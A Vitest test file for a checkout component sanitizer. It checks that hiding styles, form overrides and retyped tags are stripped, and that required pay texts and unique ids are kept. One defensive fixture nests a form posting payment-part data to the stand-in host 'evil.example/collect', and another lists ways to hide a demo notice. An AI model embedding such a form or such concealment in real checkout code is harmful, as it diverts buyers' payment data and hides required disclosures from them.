// The guards of the shop parts (src/lib/commerce/parts.ts): what a part may be
// retyped to, what can never hide a part kept in sight, the tokens a text must
// keep, roles kept unique in a control, and ids kept unique on a page.
import { describe, expect, it } from 'vitest';
import {
  SHOP_PART_ATTR,
  normalizeShopControl,
  pageWithShopParts,
  shopPartId,
  shopPartRoleOf,
  shopPartTag,
  shopPartText,
  withoutOutsideRoles,
  type ShopTreeNode,
} from '../parts';

const control = (): ShopTreeNode => ({ id: 'co', type: 'div', props: { 'data-component-kind': 'checkout-button' }, children: [] });
const full = () => normalizeShopControl(control(), 'en', 'node');

function flat(nodes: readonly ShopTreeNode[]): ShopTreeNode[] {
  return nodes.flatMap((node) => [node, ...flat(node.children ?? [])]);
}
const byRole = (nodes: readonly ShopTreeNode[], role: string) => flat(nodes).find((node) => shopPartRoleOf(node.props) === role);
const isRole = (role: string) => (node: ShopTreeNode) => shopPartRoleOf(node.props) === role;

/** The tree with `edit` applied to every node `pick` accepts. */
function editing(tree: ShopTreeNode, pick: (node: ShopTreeNode) => boolean, edit: (node: ShopTreeNode) => ShopTreeNode): ShopTreeNode {
  const next = { ...tree, children: tree.children?.map((child) => editing(child, pick, edit)) };
  return pick(tree) ? edit(next) : next;
}

describe('a part kept in sight', () => {
  it('strips what hides a wrapper between the control and the demo notice, its rules reaching inside included', () => {
    const payment = byRole(full().children!, 'checkout.payment')!;
    const badge = byRole(payment.children!, 'checkout.demo-badge')!;
    const wrapped = editing(full(), isRole('checkout.payment'), (node) => ({
      ...node,
      children: [
        {
          id: 'wrap',
          type: 'div',
          props: { style: { display: 'none', color: 'red' }, popover: 'manual', rules: [{ id: 'r', selector: '& > *', style: { opacity: 0, color: 'blue' } }] },
          children: [badge],
        },
        ...node.children!.filter((child) => child !== badge),
      ],
    }));
    const wrap = flat(normalizeShopControl(wrapped, 'en', 'node').children!).find((node) => node.id === 'wrap')!;
    expect(wrap.props?.style).toEqual({ color: 'red' });
    expect(wrap.props).not.toHaveProperty('popover');
    expect(wrap.props?.rules).toEqual([{ id: 'r', selector: '& > *', style: { color: 'blue' } }]);
  });

  it.each([
    ['a percent opacity', { opacity: '5%' }],
    ['a variable display', { display: 'var(--x)' }],
    ['a zero font size', { fontSize: '0' }],
    ['a tiny font size', { fontSize: '2px' }],
    ['a clip path', { clipPath: 'inset(50%)' }],
    ['a transform', { transform: 'scale(0)' }],
    ['a zero height', { height: '0' }],
    ['a breakpoint that hides', { visibility: { base: 'visible', mobile: 'hidden' } }],
  ])('treats %s on the demo notice as hiding', (_label, style) => {
    const next = normalizeShopControl(
      editing(full(), isRole('checkout.demo-badge'), (node) => ({ ...node, props: { ...node.props, style: { ...style, color: 'blue' } } })),
      'en',
      'node',
    );
    expect(byRole(next.children!, 'checkout.demo-badge')?.props?.style).toEqual({ color: 'blue' });
  });

  it('guards the total too', () => {
    const next = normalizeShopControl(editing(full(), isRole('checkout.total'), (node) => ({ ...node, props: { ...node.props, hidden: true, style: { display: 'none' } } })), 'en', 'node');
    const total = byRole(next.children!, 'checkout.total')!;
    expect(total.props).not.toHaveProperty('hidden');
    expect(total.props?.style).toEqual({});
  });

  it('strips popover and inert, and keeps the spec tag whatever it was retyped to', () => {
    const next = normalizeShopControl(
      editing(full(), isRole('checkout.payment-ref'), (node) => ({ ...node, type: 'template', props: { ...node.props, popover: 'auto', inert: true } })),
      'en',
      'node',
    );
    const ref = byRole(next.children!, 'checkout.payment-ref')!;
    expect(ref.type).toBe('div');
    expect(ref.props).not.toHaveProperty('popover');
    expect(ref.props).not.toHaveProperty('inert');
  });
});

describe('nothing inside a control sends', () => {
  it('turns a form into a div and drops every form override', () => {
    const payment = byRole(full().children!, 'checkout.payment')!;
    const sneaky = editing(full(), isRole('checkout.payment'), (node) => ({
      ...node,
      children: [{ id: 'f', type: 'form', props: { action: 'https://evil.example/collect', method: 'post', target: '_blank' }, children: payment.children }],
    }));
    const form = flat(normalizeShopControl(sneaky, 'en', 'node').children!).find((node) => node.id === 'f')!;
    expect(form.type).toBe('div');
    expect(form.props).toEqual({});
  });

  it('keeps every part on its tag allowlist', () => {
    expect(shopPartTag('checkout.total', 'form')).toBe('div');
    expect(shopPartTag('checkout.redirecting', 'a')).toBe('div');
    expect(shopPartTag('checkout.redirecting', 'iframe')).toBe('div');
    expect(shopPartTag('checkout.redirecting', 'dialog')).toBe('div');
    expect(shopPartTag('checkout.redirecting', 'img')).toBe('div');
    expect(shopPartTag('checkout.redirecting', 'h2')).toBe('h2');
    expect(shopPartTag('checkout.pay', 'form')).toBe('button');
    expect(shopPartTag('checkout.field.name', 'div')).toBe('label');
    expect(shopPartTag('checkout.buyer', 'div')).toBe('fieldset');
    expect(shopPartTag('checkout.buyer-legend', 'p')).toBe('legend');
    const retyped = normalizeShopControl(editing(full(), isRole('checkout.redirecting'), (node) => ({ ...node, type: 'form' })), 'en', 'node');
    expect(byRole(retyped.children!, 'checkout.redirecting')?.type).toBe('div');
  });
});

describe('text', () => {
  it('shows the default when a text drops a required token, and fixes the pay wording', () => {
    expect(shopPartText('checkout.total', 'Total', 'en')).toBe('Total to pay: {total}');
    expect(shopPartText('checkout.total', 'Summe {total}', 'de')).toBe('Summe {total}');
    expect(shopPartText('checkout.confirmed', 'Thanks!', 'en')).toBe('Order {orderNumber} confirmed. Total: {total}.');
    expect(shopPartText('checkout.returned-paid-text', { runs: [{ text: 'Danke' }] }, 'de')).toBe('Danke: Die Zahlung für Bestellung {orderNumber} ist eingegangen.');
    expect(shopPartText('checkout.pay-label', 'Pay', 'de')).toBe('Zahlungspflichtig bestellen ({total})');
    expect(shopPartText('checkout.pay-label', 'Pay', 'en')).toBe('Buy now ({total})');
  });
});

describe('roles and ids', () => {
  it('keeps a role used twice in a control only on its first part', () => {
    const tree = full();
    const pay = byRole(tree.children!, 'checkout.pay')!;
    const twice = editing(tree, isRole('checkout.actions'), (node) => ({ ...node, children: [...node.children!, { ...pay, id: 'pay-copy' }] }));
    const next = normalizeShopControl(twice, 'en', 'node');
    expect(flat(next.children!).find((node) => node.id === 'pay-copy')?.props).not.toHaveProperty(SHOP_PART_ATTR);
    expect(byRole(next.children!, 'checkout.pay')?.id).toBe(pay.id);
  });

  it('never gives a new part an id the page already uses', () => {
    // A part moved out before the move guard kept the id its control gives the part it puts back.
    const stored = normalizeShopControl(control(), 'en', 'snapshot');
    const page = {
      id: 'p',
      appComponentTree: {
        id: 'root',
        type: 'div',
        props: {},
        children: [
          { id: shopPartId('co', 'checkout.button'), type: 'button', props: {} },
          { ...stored, children: stored.children!.filter((child) => shopPartRoleOf(child.props) !== 'checkout.button') },
        ],
      },
      canvasNodes: {},
    };
    const next = pageWithShopParts(page, 'en');
    const ids = flat([next.appComponentTree as ShopTreeNode]).map((node) => node.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids).toContain(`${shopPartId('co', 'checkout.button')}-2`);
  });

  it('turns parts that leave their control into plain nodes with fresh ids, and leaves a whole control alone', () => {
    const pay = byRole(full().children!, 'checkout.pay')!;
    const out = withoutOutsideRoles(pay, (id) => `${id}-x`);
    expect(out.id).toBe(`${pay.id}-x`);
    expect(out.props).not.toHaveProperty(SHOP_PART_ATTR);
    expect(out.children?.every((child) => !shopPartRoleOf(child.props) && child.id?.endsWith('-x'))).toBe(true);
    const whole = full();
    expect(withoutOutsideRoles(whole, (id) => `${id}-x`)).toBe(whole);
  });
});
